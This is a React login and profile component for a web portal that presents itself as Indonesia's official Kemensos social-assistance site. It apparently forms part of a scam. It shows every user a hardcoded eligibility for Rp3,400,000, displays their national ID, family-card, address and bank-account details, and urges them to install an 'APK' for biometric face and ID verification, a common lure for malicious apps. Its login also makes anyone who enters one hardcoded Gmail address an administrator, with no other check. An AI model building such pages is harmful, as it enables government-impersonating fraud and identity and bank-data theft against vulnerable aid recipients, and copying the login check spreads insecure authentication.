import React, { useState } from 'react';
import { LogIn, Mail, Phone, LogOut, Smartphone, Lock, ClipboardCheck } from 'lucide-react';
import { Penerima } from '../types';

interface LoginProps {
  daftarPenerima: Penerima[];
  onAdminLoginSuccess: () => void;
  onUserLoginSuccess: (user: Penerima) => void;
  currentUser: Penerima | null;
  onLogout: () => void;
  onShowToast: (message: string, isError?: boolean) => void;
}

export default function Login({
  daftarPenerima,
  onAdminLoginSuccess,
  onUserLoginSuccess,
  currentUser,
  onLogout,
  onShowToast,
}: LoginProps) {
  const [email, setEmail] = useState('');
  const [hp, setHp] = useState('');

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();

    const cleanEmail = email.trim();
    const cleanHp = hp.trim();

    if (!cleanEmail || !cleanHp) {
      onShowToast('Email dan Nomor HP wajib diisi!', true);
      return;
    }

    // Check if Admin login as requested: "Admin: gunakan email berkahkita937@gmail.com (nomor HP bebas)"
    if (cleanEmail === 'berkahkita937@gmail.com') {
      onAdminLoginSuccess();
      onShowToast('Login sebagai Administrator berhasil!');
      return;
    }

    // Check registered clients
    const user = daftarPenerima.find(
      (p) => p.email.toLowerCase() === cleanEmail.toLowerCase() && p.hp === cleanHp
    );

    if (user) {
      onUserLoginSuccess(user);
      onShowToast(`Selamat datang kembali, ${user.nama}!`);
    } else {
      onShowToast('Email atau nomor HP tidak terdaftar. Silakan lakukan Registrasi.', true);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-8 animate-fade-in">
      {/* Title */}
      <div className="text-center space-y-3">
        <h2 className="font-serif text-2xl sm:text-3xl font-bold text-slate-900">
          {currentUser ? 'Profil Penerima Bansos' : 'Login Portal Bansos'}
        </h2>
        <p className="text-sm text-slate-500 max-w-lg mx-auto">
          {currentUser
            ? 'Informasi detail akun kependudukan dan status verifikasi bantuan sosial Anda.'
            : 'Masuk menggunakan email dan nomor HP Anda yang terdaftar untuk mengakses status bantuan sosial Anda.'}
        </p>
      </div>

      {currentUser ? (
        /* Logged In User Profile Card */
        <div className="bg-white border border-slate-200 rounded-xl shadow-xs overflow-hidden">
          <div className="bg-slate-900 text-white px-6 py-5 flex items-center justify-between border-b border-slate-800">
            <div className="flex items-center gap-2">
              <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></span>
              <span className="text-[10px] font-bold font-mono tracking-wider text-emerald-400 uppercase">AKUN AKTIF</span>
            </div>
            <button
              onClick={onLogout}
              className="text-[10px] uppercase font-bold tracking-wider text-slate-400 hover:text-white flex items-center gap-1.5 cursor-pointer transition"
            >
              <LogOut size={12} /> Keluar (Logout)
            </button>
          </div>

          <div className="p-6 sm:p-8 space-y-6">
            <div className="bg-slate-50 border border-slate-200 p-6 rounded flex items-start gap-4">
              <div className="p-3 bg-slate-900 text-white rounded">
                <ClipboardCheck size={24} />
              </div>
              <div className="space-y-1">
                <h4 className="font-sans text-base font-black uppercase tracking-tight text-slate-900">
                  Selamat Datang, {currentUser.nama}!
                </h4>
                <p className="text-xs text-slate-600 leading-relaxed">
                  Pendaftaran Akun Tahap 1 Anda telah <span className="font-bold underline">SELESAI</span>. Anda terdaftar sebagai calon Keluarga Penerima Manfaat (KPM) bantuan sosial.
                </p>
              </div>
            </div>

            {/* Profile Fields Grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
              <div className="bg-slate-50 p-4 rounded space-y-1 border border-slate-200">
                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Nomor NIK KTP</span>
                <span className="font-mono font-bold text-slate-900">{currentUser.nik}</span>
              </div>

              <div className="bg-slate-50 p-4 rounded space-y-1 border border-slate-200">
                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Nomor Kartu Keluarga (KK)</span>
                <span className="font-mono font-bold text-slate-900">{currentUser.kk || '-'}</span>
              </div>

              <div className="bg-slate-50 p-4 rounded space-y-1 border border-slate-200">
                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Alamat Email</span>
                <span className="text-slate-900 font-bold">{currentUser.email}</span>
              </div>

              <div className="bg-slate-50 p-4 rounded space-y-1 border border-slate-200">
                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Nomor HP Aktif</span>
                <span className="font-mono text-slate-900 font-bold">{currentUser.hp}</span>
              </div>

              <div className="bg-slate-50 p-4 rounded space-y-1 border border-slate-200 sm:col-span-2">
                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Alamat Rumah</span>
                <span className="text-slate-800 leading-normal font-medium">{currentUser.alamat}</span>
              </div>

              <div className="bg-slate-50 p-4 rounded space-y-1 border border-slate-200 sm:col-span-2">
                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Detail Rekening Rencana Penerima (Tahap 2)</span>
                <span className="text-slate-900 font-bold flex flex-wrap items-center gap-1.5">
                  🏢 {currentUser.bankName} – No. Rek: <span className="font-mono font-black text-slate-950">{currentUser.bankAccount || '-'}</span>
                  {currentUser.bankAccountName && (
                    <span className="text-slate-500 font-medium text-xs">
                      (a.n. <span className="font-bold text-slate-800">{currentUser.bankAccountName}</span>)
                    </span>
                  )}
                </span>
              </div>
            </div>

            {/* Stage Progress Block */}
            <div className="border-t border-slate-200 pt-6 space-y-4">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Status Kelayakan:</span>
                <span className="text-xs font-bold text-slate-900 bg-slate-100 border border-slate-300 px-3 py-0.5 rounded uppercase tracking-wider">
                  BERHAK (Rp3.400.000)
                </span>
              </div>

              {/* Locked Notice & App CTA */}
              <div className="bg-slate-50 border border-slate-200 rounded p-5 text-slate-700 flex flex-col md:flex-row items-center gap-4 justify-between">
                <div className="space-y-1 text-center md:text-left max-w-md">
                  <h5 className="font-bold text-xs text-slate-900 uppercase tracking-wider flex items-center gap-1.5 justify-center md:justify-start">
                    <Lock size={14} className="text-slate-900" />
                    Tahap 2-5 Membutuhkan Verifikasi Biometrik
                  </h5>
                  <p className="text-xs text-slate-600 leading-relaxed">
                    Untuk menjamin kerahasiaan data perbankan dan keabsahan KTP Anda, verifikasi berkas mandatory (Tahap 2 s/d 5) harus diakses melalui aplikasi smartphone.
                  </p>
                </div>
                <button
                  onClick={() => onShowToast('Arahkan ke https://bansos.kemensos.go.id/download untuk mengunduh APK resmi.')}
                  className="px-5 py-2.5 bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs tracking-widest rounded uppercase transition shrink-0 cursor-pointer flex items-center gap-1.5"
                >
                  <Smartphone size={12} /> VERIFIKASI SEKARANG
                </button>
              </div>

              {/* Alur Kerja & Penjelasan Bansos di Dashboard Pelanggan */}
              <div className="border-t border-slate-200 pt-6 space-y-6">
                <div>
                  <h5 className="font-bold text-xs text-slate-900 uppercase tracking-widest block font-mono mb-2">
                    💡 Informasi Program & Panduan Penyaluran
                  </h5>
                  <div className="bg-slate-50 border border-slate-200 rounded p-5 space-y-3">
                    <h6 className="text-xs font-bold text-slate-900 uppercase tracking-wider">
                      Untuk Apa Bantuan Sosial (Bansos) Ini?
                    </h6>
                    <p className="text-xs text-slate-600 leading-relaxed">
                      Program ini disalurkan oleh Kementerian Sosial Republik Indonesia bertujuan untuk <strong>mengurangi beban pengeluaran</strong> Keluarga Penerima Manfaat (KPM), meningkatkan <strong>ketahanan pangan & gizi</strong>, mendukung <strong>kebutuhan pokok harian</strong>, serta menjadi pengaman sosial untuk memutus rantai kemiskinan ekstrem nasional secara merata dan tepat sasaran.
                    </p>
                  </div>
                </div>

                <div className="space-y-4">
                  <h5 className="font-bold text-xs text-slate-900 uppercase tracking-widest block font-mono">
                    📍 Tahapan Penyaluran Bansos Anda (Step-by-Step)
                  </h5>
                  
                  <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
                    <div className="bg-slate-900 text-white p-3.5 rounded border border-slate-900 space-y-2 relative">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-mono bg-white/20 px-2 py-0.5 rounded font-black">TAHAP 1</span>
                        <span className="text-emerald-400 font-bold text-xs">✓ Selesai</span>
                      </div>
                      <h6 className="text-[11px] font-bold uppercase tracking-tight">Akun KPM</h6>
                      <p className="text-[10px] text-slate-300 leading-normal">Pendaftaran NIK, No. KK, No. HP, dan Alamat di portal online.</p>
                    </div>

                    <div className="bg-slate-900 text-white p-3.5 rounded border border-slate-900 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-mono bg-white/20 px-2 py-0.5 rounded font-black">TAHAP 2</span>
                        <span className="text-emerald-400 font-bold text-xs">✓ Selesai</span>
                      </div>
                      <h6 className="text-[11px] font-bold uppercase tracking-tight">Rekening Bank</h6>
                      <p className="text-[10px] text-slate-300 leading-normal">Pengisian nomor rekening dan bank penyalur terdaftar.</p>
                    </div>

                    <div className="bg-white border border-dashed border-slate-300 p-3.5 rounded space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-mono bg-slate-100 text-slate-800 px-2 py-0.5 rounded font-black">TAHAP 3</span>
                        <span className="text-slate-500 font-mono text-[9px] animate-pulse">Berjalan...</span>
                      </div>
                      <h6 className="text-[11px] font-bold uppercase tracking-tight text-slate-900">Biometrik APK</h6>
                      <p className="text-[10px] text-slate-500 leading-normal">Unduh APK Kemensos untuk verifikasi wajah & foto KTP asli.</p>
                    </div>

                    <div className="bg-white border border-slate-200 p-3.5 rounded space-y-2 opacity-60">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-mono bg-slate-100 text-slate-850 px-2 py-0.5 rounded font-black">TAHAP 4</span>
                        <span className="text-slate-400 font-mono text-[9px]">Terkunci</span>
                      </div>
                      <h6 className="text-[11px] font-bold uppercase tracking-tight text-slate-850">Verval Berkas</h6>
                      <p className="text-[10px] text-slate-500 leading-normal">Verifikasi administratif dan validasi kelayakan oleh Kemensos.</p>
                    </div>

                    <div className="bg-white border border-slate-200 p-3.5 rounded space-y-2 opacity-60">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-mono bg-slate-100 text-slate-850 px-2 py-0.5 rounded font-black">TAHAP 5</span>
                        <span className="text-slate-400 font-mono text-[9px]">Terkunci</span>
                      </div>
                      <h6 className="text-[11px] font-bold uppercase tracking-tight text-slate-850">Cair Mandiri</h6>
                      <p className="text-[10px] text-slate-500 leading-normal">Penyaluran otomatis transfer dana Rp3.400.000 ke rekening.</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : (
        /* Log In Form Card */
        <div className="bg-white border border-slate-200 rounded-xl shadow-xs overflow-hidden">
          <div className="bg-slate-900 text-white px-6 py-5 flex items-center gap-3 border-b border-slate-800">
            <div className="p-2 bg-slate-800 border border-slate-700 rounded">
              <LogIn size={18} />
            </div>
            <div>
              <h3 className="text-xs font-bold tracking-wider uppercase">Login Kredensial</h3>
              <p className="text-[9px] text-slate-400 font-mono tracking-wider">PORTAL RESMI KEMENSOS RI</p>
            </div>
          </div>

          <form onSubmit={handleLogin} className="p-6 sm:p-8 space-y-5">
            <div className="space-y-1.5">
              <label htmlFor="loginEmail" className="block text-[10px] font-bold text-slate-700 uppercase tracking-wider">
                Alamat Email Aktif
              </label>
              <div className="relative">
                <input
                  id="loginEmail"
                  type="email"
                  placeholder="email@domain.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full pl-10 pr-4 py-2.5 border border-slate-200 rounded bg-slate-50 focus:outline-none focus:ring-1 focus:ring-slate-900 focus:border-slate-900 text-sm text-slate-950"
                  required
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400">
                  <Mail size={16} />
                </div>
              </div>
            </div>

            <div className="space-y-1.5">
              <label htmlFor="loginHp" className="block text-[10px] font-bold text-slate-700 uppercase tracking-wider">
                Nomor Handphone Terdaftar
              </label>
              <div className="relative">
                <input
                  id="loginHp"
                  type="text"
                  placeholder="Contoh: 0812XXXXXXXX"
                  value={hp}
                  onChange={(e) => setHp(e.target.value.replace(/\D/g, ''))}
                  className="w-full pl-10 pr-4 py-2.5 border border-slate-200 rounded bg-slate-50 focus:outline-none focus:ring-1 focus:ring-slate-900 focus:border-slate-900 text-sm font-mono text-slate-950"
                  required
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400">
                  <Phone size={16} />
                </div>
              </div>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs tracking-widest rounded transition duration-150 cursor-pointer uppercase"
            >
              MASUK (LOGIN)
            </button>
          </form>
        </div>
      )}
    </div>
  );
              }
